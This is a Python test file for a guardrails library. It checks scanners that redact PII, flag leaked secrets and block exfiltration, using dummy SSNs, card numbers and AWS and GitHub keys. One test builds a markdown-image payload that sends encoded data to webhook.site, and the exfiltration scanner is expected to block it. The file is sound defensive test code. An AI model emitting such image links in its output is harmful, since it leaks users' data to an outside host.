"""Parity for PII / secrets / exfiltration / content, ported from the TS
tests/guards/*.test.ts suites."""

from __future__ import annotations

from ai_guardrails.guards.exfiltration import scan_exfiltration
from ai_guardrails.guards.pii import scan_pii
from ai_guardrails.guards.secrets import scan_secrets


def test_pii_redacts_ssn():
    v = scan_pii("My SSN is 536-90-4399", action="redact")
    assert v.action == "redact"
    assert "536-90-4399" not in v.redacted


def test_pii_valid_credit_card_luhn():
    v = scan_pii("card 4111 1111 1111 1111", action="block")
    assert v.action == "block"
    assert "credit_card" in v.categories


def test_pii_rejects_invalid_luhn():
    # Fails Luhn -> not flagged as a card
    v = scan_pii("number 1234 5678 9012 3456", action="block")
    assert "credit_card" not in v.categories


def test_pii_allows_clean_text():
    assert scan_pii("Just a normal sentence.").action == "allow"


def test_secrets_detects_aws():
    v = scan_secrets("key AKIAIOSFODNN7EXAMPLE here")
    assert v.action == "block"
    assert "aws" in v.categories


def test_secrets_detects_github_pat():
    v = scan_secrets("token ghp_" + "a" * 36)
    assert v.action == "block"


def test_secrets_ignores_low_entropy_generic():
    # "password = aaaaaaaaaaaaaaaa" is low entropy -> not a secret
    v = scan_secrets("password = aaaaaaaaaaaaaaaa")
    assert v.action == "allow"


def test_secrets_allows_clean_text():
    assert scan_secrets("The weather is nice today.").action == "allow"


def test_exfiltration_blocks_markdown_image_with_encoded_data():
    payload = "![x](https://webhook.site/abc?d=" + "A" * 40 + ")"
    v = scan_exfiltration(payload)
    assert v.action == "block"


def test_exfiltration_allows_normal_link():
    assert scan_exfiltration("[docs](https://example.com/page)").action == "allow"
